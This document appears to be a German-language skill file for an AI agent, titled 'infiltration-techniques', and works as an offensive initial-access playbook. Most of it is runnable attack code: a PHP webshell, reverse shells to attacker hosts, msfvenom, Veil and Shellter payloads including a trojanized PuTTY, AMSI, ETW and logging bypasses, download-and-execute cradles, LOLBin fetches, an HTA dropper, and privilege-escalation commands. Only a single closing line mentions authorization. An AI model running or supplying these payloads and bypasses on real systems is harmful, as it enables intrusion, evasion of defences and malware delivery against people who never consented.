---
name: infiltration-techniques
description: Infiltrations-Techniken – Initialer Zugriff, Payload-Delivery und AV/EDR-Evasion
version: 1.0.0
---

# Infiltrations-Techniken (Initial Access & Payload Delivery)

## 概述 (Übersicht)

Infiltration bezeichnet alle Techniken zur Erlangung des initialen Zugriffs auf ein Zielsystem.
Nach dem Reconnaissance-Phase werden Schwachstellen ausgenutzt, Payloads delivered und
Sicherheitslösungen umgangen. Diese Skill-Beschreibung fokussiert auf technische Infiltrations-Vektoren,
AV/EDR-Bypass und Payload-Delivery-Mechanismen.

## Infiltrations-Vektoren

### 1. Exploitation öffentlich erreichbarer Services

```bash
# Service-Version ermitteln
nmap -sV -sC -p- 192.168.1.100

# Bekannte CVEs suchen
searchsploit apache 2.4.49
nmap --script vuln 192.168.1.100

# Nuclei für automatisierte Schwachstellen-Erkennung
nuclei -u https://target.com -t cves/ -severity high,critical

# Metasploit Exploitation
metasploit exploit/multi/handler '{"LHOST":"192.168.1.10","LPORT":"4444","PAYLOAD":"windows/x64/meterpreter/reverse_tcp"}'
```

### 2. Web Application Exploitation

```bash
# Remote Code Execution via Webshell
# Nach SQL Injection / File-Upload-Schwachstelle

# PHP Webshell hochladen
# POST /upload.php mit shell.php:
# <?php system($_GET['cmd']); ?>

# Webshell-Nutzung
curl "http://target.com/uploads/shell.php?cmd=id"
curl "http://target.com/uploads/shell.php?cmd=wget+http://attacker.com/payload+-O+/tmp/p"

# Reverse Shell via curl
curl "http://target.com/uploads/shell.php?cmd=$(python3 -c 'import urllib.parse; print(urllib.parse.quote("bash -i >& /dev/tcp/192.168.1.10/4444 0>&1"))')"
```

### 3. Payload-Generierung

#### msfvenom (Basis-Payloads)

```bash
# Windows Meterpreter (Reverse HTTPS)
msfvenom -p windows/x64/meterpreter/reverse_https \
  LHOST=attacker.com LPORT=443 \
  -f exe -o payload.exe

# Linux ELF Reverse Shell
msfvenom -p linux/x64/meterpreter/reverse_tcp \
  LHOST=192.168.1.10 LPORT=4444 \
  -f elf -o payload.elf

# PowerShell-Payload (in-memory)
msfvenom -p windows/x64/meterpreter/reverse_https \
  LHOST=attacker.com LPORT=443 \
  -f ps1 -o payload.ps1

# Encoded Payload (AV-Bypass)
msfvenom -p windows/x64/meterpreter/reverse_https \
  LHOST=attacker.com LPORT=443 \
  -e x64/xor_dynamic -i 5 \
  -f exe -o payload_encoded.exe

# DLL Payload (Sideloading)
msfvenom -p windows/x64/meterpreter/reverse_https \
  LHOST=attacker.com LPORT=443 \
  -f dll -o version.dll

# Macro-Payload (Office)
msfvenom -p windows/x64/meterpreter/reverse_tcp \
  LHOST=192.168.1.10 LPORT=4444 \
  -f vba -o macro.vba
```

#### Veil (AV-Evasion)

```bash
# Python-basierter Payload (niedrige Erkennungsrate)
veil -t Evasion -p python/meterpreter/rev_tcp \
  --ip 192.168.1.10 --port 4444 -o evaded_payload

# Go-basierter Payload (sehr niedrige Erkennungsrate)
veil -t Evasion -p go/meterpreter/rev_tcp.py \
  --ip 192.168.1.10 --port 4444 -o go_payload

# PowerShell-Payload
veil -t Evasion -p powershell/meterpreter/rev_tcp \
  --ip 192.168.1.10 --port 4444 -o ps_payload
```

#### Shellter (PE-Injection)

```bash
# Legitime Binary trojanisieren
wget https://the.earth.li/~sgtatham/putty/latest/w64/putty.exe

# Shellcode injizieren
shellter -f putty.exe -a -p windows/meterpreter/reverse_https \
  --lhost attacker.com --lport 443 --stealth

# Mit benutzerdefiniertem Shellcode
shellter -f calc.exe -a --stealth
# Dann interaktiv: C -> Custom Shellcode eingeben
```

## AV/EDR-Bypass-Techniken

### AMSI-Bypass (PowerShell)

```powershell
# AMSI-Bypass Methode 1: Reflection
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)

# AMSI-Bypass Methode 2: Patch (obfuskiert)
$a = [Ref].Assembly.GetType('System.Management.Automation.Am'+'siUtils')
$b = $a.GetField('amsi'+'InitFailed','NonPublic,Static')
$b.SetValue($null,$true)

# ETW-Bypass (Event Tracing for Windows)
[System.Diagnostics.Eventing.EventProvider].GetField('m_enabled','NonPublic,Instance').SetValue([Ref].Assembly.GetType('System.Management.Automation.Tracing.PSEtwLogProvider').GetField('etwProvider','NonPublic,Static').GetValue($null),0)
```

### Script Block Logging Bypass

```powershell
# Logging deaktivieren
$settings = [System.Management.Automation.Utils].GetField("cachedGroupPolicySettings", "NonPublic,Static").GetValue($null)
$settings["HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging"] = @{}
$settings["HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging"].Add("EnableScriptBlockLogging", "0")
```

### In-Memory-Execution (kein Disk-Schreiben)

```powershell
# Payload direkt im Speicher laden
IEX (New-Object Net.WebClient).DownloadString('http://attacker.com/payload.ps1')

# Via Encoded Command
$cmd = "IEX (New-Object Net.WebClient).DownloadString('http://attacker.com/payload.ps1')"
$bytes = [System.Text.Encoding]::Unicode.GetBytes($cmd)
$encoded = [Convert]::ToBase64String($bytes)
powershell.exe -EncodedCommand $encoded

# Reflective DLL Injection
# (Via Metasploit post/windows/manage/reflective_dll_inject)
```

### Process Injection

```bash
# Via Metasploit
# migrate <pid>  (in Meterpreter-Session)

# CreateRemoteThread Injection (C-Code / BOF)
# Sliver BOF:
execute-bof /tools/inject.o --pid 1234 --shellcode payload.bin

# Via Havoc – Process Injection
# inject shellcode 1234 /path/to/shellcode.bin
```

### Living-off-the-Land (LOLBins)

```powershell
# MSBuild.exe – XML-Payload ausführen
msbuild.exe /nologo payload.xml

# Regsvr32 – COM-Scriptlet (APT-Favorit)
regsvr32.exe /s /u /i:http://attacker.com/payload.sct scrobj.dll

# Rundll32 – DLL ausführen
rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();GetObject("script:http://attacker.com/payload.sct")

# Certutil – Payload herunterladen
certutil.exe -urlcache -split -f http://attacker.com/payload.exe C:\Windows\Temp\payload.exe

# BITSAdmin – Hintergrund-Download
bitsadmin /transfer job /download /priority foreground http://attacker.com/payload.exe C:\Windows\Temp\p.exe

# WMI – Prozess starten (remote)
wmic /node:target.host process call create "cmd /c payload.exe"

# InstallUtil – Bypass AppLocker
installutil.exe /logfile= /LogToConsole=false /U payload.exe
```

## Delivery-Mechanismen

### HTA-Payload (HTML Application)

```html
<!-- payload.hta -->
<html>
<head>
<script language="VBScript">
  Set objShell = CreateObject("WScript.Shell")
  objShell.Run "powershell.exe -nop -w hidden -enc <base64_payload>", 0, False
  self.close()
</script>
</head>
</html>
```

```bash
# HTA via mshta ausführen (remote)
mshta.exe http://attacker.com/payload.hta
```

### PowerShell Delivery

```powershell
# Cradle 1: Download + Execute
powershell -nop -w hidden -c "IEX(New-Object Net.WebClient).DownloadString('http://attacker.com/ps.ps1')"

# Cradle 2: WebClient mit User-Agent
powershell -nop -w hidden -c "
  $wc = New-Object System.Net.WebClient;
  $wc.Headers.Add('User-Agent','Mozilla/5.0');
  IEX($wc.DownloadString('http://attacker.com/payload.ps1'))
"

# Cradle 3: Bits Transfer
powershell -nop -w hidden -c "
  Start-BitsTransfer -Source http://attacker.com/payload.exe -Destination C:\Windows\Temp\update.exe;
  Start-Process C:\Windows\Temp\update.exe
"
```

### Listener einrichten

```bash
# Metasploit Multi-Handler
metasploit multi/handler '{"PAYLOAD":"windows/x64/meterpreter/reverse_https","LHOST":"attacker.com","LPORT":"443"}'

# Netcat-Listener (einfache Shell)
nc -lvnp 4444

# Sliver HTTPS-Listener
sliver-client
https --lhost 0.0.0.0 --lport 443 --domain attacker.com
```

## Privilege Escalation nach Initial Access

### Windows

```bash
# WinPEAS – Automatische Enumeration
winpeas all

# Manual Checks
whoami /priv                          # Privilegien prüfen
whoami /groups                        # Gruppen-Mitgliedschaft
net user <username>                   # User-Details
net localgroup administrators         # Lokale Admins

# SeImpersonatePrivilege -> PrintSpoofer/GodPotato
PrintSpoofer.exe -i -c "powershell.exe"
GodPotato.exe -cmd "cmd /c whoami"

# AlwaysInstallElevated
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
msiexec /quiet /qn /i C:\Windows\Temp\payload.msi
```

### Linux

```bash
# LinPEAS – Automatische Enumeration
curl -sL http://attacker.com/linpeas.sh | bash

# SUID-Binaries
find / -perm -4000 -type f 2>/dev/null

# Sudo-Rechte
sudo -l

# Cron Jobs (schwache Permissions)
cat /etc/crontab
ls -la /var/spool/cron/

# Kernel-Exploit
uname -a  # Kernel-Version prüfen
# searchsploit linux kernel <version>
```

## Testcheckliste

### Initial Access
- [ ] Öffentliche Services auf bekannte CVEs geprüft
- [ ] Web-Applikationen auf RCE-Schwachstellen getestet
- [ ] Payload generiert und AV-Erkennung geprüft
- [ ] Listener eingerichtet und getestet

### AV/EDR-Bypass
- [ ] AMSI-Bypass bei PowerShell-Payloads angewendet
- [ ] In-Memory-Execution getestet (kein Disk-Schreiben)
- [ ] LOLBins als Delivery-Mechanismus evaluiert
- [ ] Payload-Obfuskation via Veil/Shellter getestet

### Post-Initial-Access
- [ ] Privilege Escalation versucht (WinPEAS/LinPEAS)
- [ ] Persistenz eingerichtet
- [ ] C2-Verbindung stabil und verschlüsselt
- [ ] Lateral Movement eingeleitet

## Wichtige Hinweise

- Nur in autorisierten Penetrationstest-Umgebungen einsetzen
- AV/EDR-Bypass-Techniken regelmäßig auf neue Signaturen prüfen
- Payloads vor echtem Einsatz in isolierter VM testen
- LOLBins können auch in stark gesicherten Umgebungen funktionieren
- Alle Aktionen für Reporting dokumentieren
